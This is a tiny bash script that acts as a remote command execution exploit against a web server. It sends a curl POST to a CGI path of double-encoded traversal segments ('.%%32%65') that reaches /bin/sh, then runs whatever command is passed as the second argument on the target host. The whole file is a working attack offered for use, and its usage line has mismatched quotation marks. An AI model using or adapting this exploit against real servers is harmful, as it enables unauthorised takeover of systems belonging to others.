#!/bin/bash

if [[ $# -eq 0 ]]; then
	echo "try.sh HOST "COMMAND"
	exit 0
fi

curl  "http://$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" --data "echo Content-Type: text/plain; echo; $2"
